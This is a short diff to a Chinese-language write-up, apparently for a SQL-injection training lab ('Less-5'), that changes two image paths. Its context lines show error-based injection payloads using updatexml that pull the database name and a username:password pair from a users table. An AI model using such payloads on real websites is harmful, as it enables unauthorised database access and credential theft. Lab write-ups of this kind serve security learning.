@@ -24,7 +24,7 @@
 ?id=-1' and updatexml(1,concat(0x7e,(database()),0x7e),1) --+
 ```
 
-![](assets/Less5/file-20260530143929579.png)
+![](assets/Less-5/file-20260530180139828.png)
 
 剩下的就不一一叙述了 
 payload
@@ -32,4 +32,4 @@ payload
 ?id=-1' and updatexml(1,concat(0x7e,(select concat(username,':',password) from users limit 0,1),0x7e),1)--+
 
 ```
-![](assets/Less5/file-20260530144227715.png)
+![](assets/Less-5/file-20260530180139826.png)
